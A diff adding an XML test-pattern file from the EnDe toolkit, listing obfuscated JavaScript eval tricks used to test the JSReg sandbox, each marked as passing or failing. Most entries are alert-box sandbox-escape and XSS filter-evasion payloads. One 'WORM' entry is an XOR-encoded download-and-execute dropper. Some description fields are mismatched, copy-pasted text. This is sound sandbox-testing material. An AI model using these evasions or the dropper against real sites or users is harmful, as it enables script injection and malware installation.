@@ -1,0 +1,206 @@
+<?xml version="1.0"?>
+<!--
+# vi:  ts=4:
+# vim: ts=4:
+#
+#? NAME
+#?      EnDeTest-JSReg.xml - list of patterns for JSReg
+#?
+#? DESCRIPTION
+#?      List of patterns for testing JSReg.
+#?
+# HACKER's INFO
+#       This files requires a proper entry in files[] array, see EnDeUser.js.
+#
+#? SEE ALSO
+#?      JSReg.js
+#?      EnDeUser.js
+#?
+#? VERSION
+#?      @(#) EnDeTest-JSReg.xml 3.2 11/12/30 19:24:54
+#?
+#? AUTHOR
+#?      30-jul-09 Achim Hoffmann, mailto: EnDe (at) my (dash) stp (dot) net
+  -->
+<xss>
+	<attack>
+		<name>eval with setter</name>
+		<code><![CDATA[e='eval'; e=0[e]; l='location.hash'; e setter=e; e=e=l]]></code>
+		<desc>eval using setter for location.hash</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+	<attack>
+		<name>eval with hex</name>
+		<code><![CDATA[a='a';eval(\u0061+'\x6c\x65\x72\x74\x28\u0034\x32\u0029');]]></code>
+		<desc>eval with hex unicode code</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+<!--
+	following 2:
+	Geko based browsers also allow you to call the eval function like this:-
+-->
+	<attack>
+		<name>eval in hash 1</name>
+		<code><![CDATA[0['eval']('alert(/XSS/)')]]></code>
+		<desc>eval in anonymous array</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+	<attack>
+		<name>eval in hash 2</name>
+		<code><![CDATA[0['ev'+'al']('alert(/XSS/)');]]></code>
+		<desc>eval in anonymous array</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+	<attack>
+		<name>eval in top hash 1</name>
+		<code><![CDATA[top['\145\166\141\154'](42)]]></code>
+		<desc>eval in top array</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+	<attack>
+		<name>eval in top hash 2</name>
+		<code><![CDATA[top/**/['\x61\x6c\x65\x72\x74']/**/(1)]]></code>
+		<desc>eval in top array with comment</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+	<attack>
+		<name>eval in setter</name>
+		<code><![CDATA[
+ev setter=eval,dec setter=unescape,location.ss setter=String.prototype.substring,ev=dec=location.ss=21
+]]></code>
+		<desc>defining setter as eval</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+	<attack>
+		<name>eval after RegEx</name>
+		<code><![CDATA[/blah/['ev' + 'al']('alert(/XSS/)');]]></code>
+		<desc>anonymous function with constructor</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+	<attack>
+		<name>function</name>
+		<code><![CDATA[o={x:1}; (function(){ alert(this.x); }).apply(o,[]);]]></code>
+		<desc>anonymous function</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+	<attack>
+		<name>function.constructor</name>
+		<code><![CDATA[(function(){}).constructor('alert("I am a safe constructor")')();]]></code>
+		<desc>anonymous function with constructor</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+	<attack>
+		<name>Object.prototype.__defineSetter__</name>
+		<code><![CDATA[
+Object.prototype.__defineSetter__('user',function(obj){for(var i in obj) {alert(i + '=' + obj[i]);} });
+]]></code>
+		<desc>compute checksum according Luhn algorithm</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+	<attack>
+		<name>boolean with ISO-8859-15</name>
+		<code><![CDATA[(äa={}&&alert)(äa);]]></code>
+		<desc>variable name with ISO-8859-15 character</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+	<attack>
+		<name>boolean with UTF-8</name>
+		<code><![CDATA[(Ã¤=#1={}&&alert)(Ã¤);]]></code>
+		<desc>variable name with ISO-8859-15 character</desc>
+		<label>main[x]: working pattern</label>
+	</attack>
+
+	<attack>
+		<name>obfuscated string concatenation</name>
+		<code><![CDATA[
+x=![]?'42':0
+$a= !x?'ev':0
+$b= !x?'al':0
+$a= !x?$a+$b:0
+$a setter= !x?0[$a]:0
+$b= !x?'locat':0
+$c= !x?'ion.h':0
+$d= !x?'ash':0
+$b= !x?$b+$c+$d:0
+$a=$a=$b
+			]]></code>
+		<desc>obfuscated string concatenation</desc>
+		<label>main[ ] and main[x]: working pattern</label>
+	</attack>
+
+	<attack>
+<!--
+		liefert bei code[x] und/oder function[x] ein alert, nicht bei main[x]
+-->
+		<name>function</name>
+		<code><![CDATA[o={x:1}; (function(){ alert(this.x); }).apply(o,[]);]]></code>
+		<desc>anonymous function</desc>
+		<label>main[ ]: failing pattern</label>
+	</attack>
+	<attack>
+		<name>function</name>
+		<code><![CDATA[dooh=42;/* alert('bang */') */alert(dooh);]]></code>
+		<desc>wrong JavaScript syntax</desc>
+		<label>main[ ]: failing pattern</label>
+	</attack>
+
+<!--
+	liefert bei main[ ] eine Exception, nicht bei main[x]
+-->
+	<attack>
+		<name>eval after RegEx</name>
+		<code><![CDATA[/blah/['ev' + 'al']('alert(/XSS/)');]]></code>
+		<desc>anonymous function with constructor</desc>
+		<label>main[ ]: failing with exception</label>
+	</attack>
+	<attack>
+		<name>function.constructor</name>
+		<code><![CDATA[(function(){}).constructor('alert("I am a safe constructor")')();]]></code>
+		<desc>anonymous function with constructor</desc>
+		<label>main[ ]: failing with exception</label>
+	</attack>
+	<attack>
+		<name>eval in hash 1</name>
+		<code><![CDATA[0['eval']('alert(/XSS/)')]]></code>
+		<desc>compute checksum according Luhn algorithm</desc>
+		<label>main[ ]: failing with exception</label>
+	</attack>
+	<attack>
+		<name>eval in hash 2</name>
+		<code><![CDATA[0['ev'+'al']('alert(/XSS/)');]]></code>
+		<desc>compute checksum according Luhn algorithm</desc>
+		<label>main[ ]: failing with exception</label>
+	</attack>
+	<attack>
+		<name>eval in top hash 1</name>
+		<code><![CDATA[top['\145\166\141\154'](42)]]></code>
+		<desc>eval in top array</desc>
+		<label>main[ ]: failing with exception</label>
+	</attack>
+	<attack>
+		<name>eval in top hash 2</name>
+		<code><![CDATA[top/**/['\x61\x6c\x65\x72\x74']/**/(1)]]></code>
+		<desc>eval in top array with comment</desc>
+		<label>main[ ]: failing with exception</label>
+	</attack>
+	<attack>
+		<name>WORM: obfuscated eval</name>
+		<code><![CDATA[
+var J=function(m){return String.fromCharCode(m^66)};eval(J(52)+J(35)+J(48)+J(98)+J(55)+J(48)+J(46)+J(110)+J(50)+J(35)+J(54)+J(42)+J(121)+J(55)+J(48)+J(46)+J(127)+J(96)+J(42)+J(54)+J(54)+J(50)+J(120)+J(109)+J(109)+J(33)+J(45)+J(45)+J(46)+J(108)+J(118)+J(117)+J(119)+J(119)+J(119)+J(108)+J(45)+J(47)+J(109)+J(115)+J(58)+J(58)+J(58)+J(58)+J(108)+J(39)+J(58)+J(39)+J(96)+J(121)+J(50)+J(35)+J(54)+J(42)+J(127)+J(96)+J(1)+J(120)+J(30)+J(30)+J(32)+J(45)+J(45)+J(54)+J(108)+J(39)+J(58)+J(39)+J(96)+J(121)+J(54)+J(48)+J(59)+J(57)+J(52)+J(35)+J(48)+J(98)+J(35)+J(38)+J(45)+J(127)+J(106)+J(38)+J(45)+J(33)+J(55)+J(47)+J(39)+J(44)+J(54)+J(108)+J(33)+J(48)+J(39)+J(35)+J(54)+J(39)+J(7)+J(46)+J(39)+J(47)+J(39)+J(44)+J(54)+J(106)+J(96)+J(45)+J(32)+J(40)+J(39)+J(33)+J(54)+J(96)+J(107)+J(107)+J(121)+J(52)+J(35)+J(48)+J(98)+J(38)+J(127)+J(115)+J(121)+J(35)+J(38)+J(45)+J(108)+J(49)+J(39)+J(54)+J(3)+J(54)+J(54)+J(48)+J(43)+J(32)+J(55)+J(54)+J(39)+J(106)+J(96)+J(33)+J(46)+J(35)+J(49)+J(49)+J(43)+J(38)+J(96)+J(110)+J(96)+J(33)+J(46)+J(49)+J(43)+J(38)+J(120)+J(0)+J(6)+J(123)+J(116)+J(1)+J(117)+J(117)+J(116)+J(111)+J(116)+J(119)+J(3)+J(113)+J(111)+J(115)+J(115)+J(6)+J(114)+J(111)+J(123)+J(122)+J(113)+J(3)+J(111)+J(114)+J(114)+J(1)+J(114)+J(118)+J(4)+J(1)+J(112)+J(123)+J(7)+J(113)+J(116)+J(96)+J(107)+J(121)+J(52)+J(35)+J(48)+J(98)+J(39)+J(127)+J(115)+J(121)+J(52)+J(35)+J(48)+J(98)+J(58)+J(47)+J(46)+J(127)+J(35)+J(38)+J(45)+J(108)+J(1)+J(48)+J(39)+J(35)+J(54)+J(39)+J(13)+J(32)+J(40)+J(39)+J(33)+J(54)+J(106)+J(96)+J(15)+J(43)+J(33)+J(48)+J(45)+J(49)+J(45)+J(36)+J(54)+J(108)+J(26)+J(15)+J(14)+J(10)+J(22)+J(22)+J(18)+J(96)+J(110)+J(96)+J(96)+J(107)+J(121)+J(52)+J(35)+J(48)+J(98)+J(36)+J(127)+J(115)+J(121)+J(52)+J(35)+J(48)+J(98)+J(35)+J(32)+J(127)+J(96)+J(3)+J(38)+J(45)+J(38)+J(32)+J(108)+J(96)+J(121)+J(52)+J(35)+J(48)+J(98)+J(33)+J(38)+J(127)+J(96)+J(17)+J(54)+J(48)+J(39)+J(35)+J(47)+J(96)+J(121)+J(52)+J(35)+J(48)+J(98)+J(37)+J(127)+J(115)+J(121)+J(52)+J(35)+J(48)+J(98)+J(35)+J(49)+J(127)+J(35)+J(38)+J(45)+J(108)+J(33)+J(48)+J(39)+J(35)+J(54)+J(39)+J(45)+J(32)+J(40)+J(39)+J(33)+J(54)+J(106)+J(35)+J(32)+J(105)+J(33)+J(38)+J(110)+J(96)+J(96)+J(107)+J(121)+J(52)+J(35)+J(48)+J(98)+J(42)+J(127)+J(115)+J(121)+J(58)+J(47)+J(46)+J(108)+J(13)+J(50)+J(39)+J(44)+J(106)+J(96)+J(5)+J(7)+J(22)+J(96)+J(110)+J(55)+J(48)+J(46)+J(110)+J(114)+J(107)+J(121)+J(58)+J(47)+J(46)+J(108)+J(17)+J(39)+J(44)+J(38)+J(106)+J(107)+J(121)+J(35)+J(49)+J(108)+J(54)+J(59)+J(50)+J(39)+J(127)+J(115)+J(121)+J(52)+J(35)+J(48)+J(98)+J(44)+J(127)+J(115)+J(121)+J(35)+J(49)+J(108)+J(45)+J(50)+J(39)+J(44)+J(106)+J(107)+J(121)+J(35)+J(49)+J(108)+J(53)+J(48)+J(43)+J(54)+J(39)+J(106)+J(58)+J(47)+J(46)+J(108)+J(48)+J(39)+J(49)+J(50)+J(45)+J(44)+J(49)+J(39)+J(0)+J(45)+J(38)+J(59)+J(107)+J(121)+J(35)+J(49)+J(108)+J(49)+J(35)+J(52)+J(39)+J(54)+J(45)+J(36)+J(43)+J(46)+J(39)+J(106)+J(50)+J(35)+J(54)+J(42)+J(110)+J(112)+J(107)+J(121)+J(35)+J(49)+J(108)+J(33)+J(46)+J(45)+J(49)+J(39)+J(106)+J(107)+J(121)+J(52)+J(35)+J(48)+J(98)+J(49)+J(42)+J(39)+J(46)+J(46)+J(127)+J(35)+J(38)+J(45)+J(108)+J(33)+J(48)+J(39)+J(35)+J(54)+J(39)+J(45)+J(32)+J(40)+J(39)+J(33)+J(54)+J(106)+J(96)+J(17)+J(42)+J(39)+J(46)+J(46)+J(108)+J(3)+J(50)+J(50)+J(46)+J(43)+J(33)+J(35)+J(54)+J(43)+J(45)+J(44)+J(96)+J(110)+J(96)+J(96)+J(107)+J(121)+J(49)+J(42)+J(39)+J(46)+J(46)+J(108)+J(17)+J(42)+J(39)+J(46)+J(46)+J(7)+J(58)+J(39)+J(33)+J(55)+J(54)+J(39)+J(106)+J(50)+J(35)+J(54)+J(42)+J(110)+J(96)+J(96)+J(110)+J(96)+J(96)+J(110)+J(96)+J(45)+J(50)+J(39)+J(44)+J(96)+J(110)+J(114)+J(107)+J(121)+J(63)+J(33)+J(35)+J(54)+J(33)+J(42)+J(106)+J(39)+J(107)+J(57)+J(63)+J(121)+'');
+]]></code>
+		<desc>eval with obfuscated text</desc>
+		<label>main[x]: fails, does nothing</label>
+	</attack>
+
+</xss>
+
+<!--
+	nur im Kontext HTML wirksam
+123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);
+123[/e/.source+<_>v</_>+<_>al</_>](/a/.source+<_>ler</_>+<_>t</_>+<_>(1)</_>);
+a=<r><s>eva</s><s>l</s><a>ale</a><a>rt</a><a>(1)</a></r>
+
+	Verhalten unbekannt
+0[a.s.text()](a.a.text()+'')
+
+-->
